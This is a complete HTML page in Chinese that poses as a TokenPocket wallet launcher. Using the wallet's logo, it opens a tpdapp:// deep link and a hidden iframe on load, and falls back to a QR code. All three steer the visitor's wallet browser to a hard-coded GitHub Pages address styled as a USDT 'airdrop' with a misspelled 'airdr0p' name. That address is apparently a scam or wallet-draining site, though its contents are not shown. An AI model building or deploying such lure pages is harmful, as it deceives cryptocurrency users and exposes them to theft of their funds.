<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>正在打开 TP 钱包...</title>
  <style>
    body {
      margin: 0; padding: 0; background: #000; color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      text-align: center; overflow: hidden;
    }
    .container {
      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
      width: 90%;
    }
    .logo { width: 80px; margin-bottom: 20px; }
    .loading {
      font-size: 18px; margin: 20px 0;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0% { opacity: 0.6; }
      50% { opacity: 1; }
      100% { opacity: 0.6; }
    }
    .qrcode { margin-top: 30px; display: none; }
    .qrcode img { width: 180px; border: 8px solid white; border-radius: 12px; }
    .tip { font-size: 14px; color: #aaa; margin-top: 15px; }
  </style>
</head>
<body>

<div class="container">
  <img src="https://tokenpocket.pro/static/logo.png" alt="TP" class="logo">
  <div class="loading">正在唤醒 TokenPocket 钱包（BSC）...</div>
  <div id="qrcode" class="qrcode">
    <p style="margin:10px 0; font-size:16px;">请用 TP 钱包扫码打开</p>
    <img id="qr-img" src="" alt="二维码">
  </div>
  <p class="tip">如果未自动跳转，请长按保存二维码</p>
</div>

<script>
const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";

// 检测是否在 TP 浏览器
function isTPBrowser() {
  const ua = navigator.userAgent.toLowerCase();
  return ua.indexOf('tokenpocket') !== -1 || ua.indexOf('tpdapp') !== -1;
}

// 显示二维码
function showQR() {
  const qr = document.getElementById('qrcode');
  const img = document.getElementById('qr-img');
  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(TARGET_URL)}`;
  qr.style.display = 'block';
}

// 主函数：自动唤醒 TP（BSC）
function autoOpenTP() {
  if (isTPBrowser()) {
    location.href = TARGET_URL;
    return;
  }

  const params = {
    url: TARGET_URL,
    chain: "BSC",
    source: "web"
  };
  const encoded = encodeURIComponent(JSON.stringify(params));
  const scheme = `tpdapp://open?params=${encoded}`;

  // 立即尝试唤醒
  window.location.href = scheme;

  // iOS 增强唤醒
  setTimeout(() => {
    try {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = scheme;
      document.body.appendChild(iframe);
      setTimeout(() => document.body.removeChild(iframe), 2000);
    } catch (e) {}
  }, 300);

  // 3.5 秒后显示二维码（兜底）
  setTimeout(showQR, 3500);
}

// 页面加载后立即执行
window.onload = autoOpenTP;
</script>

</body>
</html>
